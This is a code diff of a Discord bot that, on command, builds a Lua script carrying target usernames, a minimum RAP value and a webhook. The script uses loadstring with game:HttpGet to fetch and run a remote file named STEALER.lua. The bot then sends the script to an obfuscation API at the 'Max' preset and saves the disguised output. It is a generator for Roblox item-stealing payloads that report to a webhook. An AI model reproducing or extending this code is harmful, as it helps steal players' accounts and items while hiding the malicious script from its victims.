@@ -142,17 +142,15 @@ client.on("interactionCreate", async (interaction) => {
 
                 // Example Lua script (replace with actual script content)
                 const luaScript = `
-                    local a=[[
-                    _G.Username = "${username}"
-                    _G.Username2 = "${username_sec}"
-                    _G.minrap = ${rap}
-                    _G.webhook = "${webhook}"
-                    loadstring(game:HttpGet("https://raw.githubusercontent.com/RAYZHUB/RAYZHUB-SCRIPTS/refs/heads/main/STEALER.lua"))()
-                    ]]
-                    `;
+                local a=[[
+                _G.Username = "${username}"
+                _G.Username2 = "${username_sec}"
+                _G.minrap = ${rap}
+                _G.webhook = "${webhook}"
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/RAYZHUB/RAYZHUB-SCRIPTS/refs/heads/main/STEALER.lua"))()
+                ]]
+                `;
 
-                
-                
                 // Save the Lua script to a file
                 fs.writeFileSync(LUA_FILE_PATH, luaScript, "utf8");
 
@@ -162,20 +160,24 @@ client.on("interactionCreate", async (interaction) => {
                     "Content-Type": "application/json",
                     "Authorization": `Bearer ${API_KEY}`,
                 };
+
+
                 // Payload (Customize options if needed)
                 const payload = {
                     script: luaScript,
                     options: {
                         Preset: "Max", // Options: Default, Light, Max
-                        },
+                    },
                 };
 
                 // Send request to obfuscate Lua script
+
                 axios.post(url, payload, { headers })
+
                     .then(response => {
                         if (response.data.obfuscated_script) {
                             console.log("✅ Obfuscation Successful!");
-                            // Save the obfuscated script
+                            // Save the obfuscated scrip
                             fs.writeFileSync("obfuscated.lua", response.data.obfuscated_script, "utf8");
                             console.log("✅ Obfuscated script saved to obfuscated.lua");
                             // Save obfuscated script to output file
@@ -188,16 +190,9 @@ client.on("interactionCreate", async (interaction) => {
                     .catch(error => {
                         console.error("❌ Error:", error.response ? error.response.data : error.message);
                     });
+
             } catch (error) {
                 console.error(`❌ Execution error: ${error.message}`);
-            }
-            
-            // Save the output to a file
-                fs.writeFileSync(outputFileName, output);
-                
-            } catch (error) {
-                console.error(`Execution error: ${error.message}`);
-                interaction.followUp({ content: "❌ Lua execution failed!", ephemeral: true });
             }
     
                 
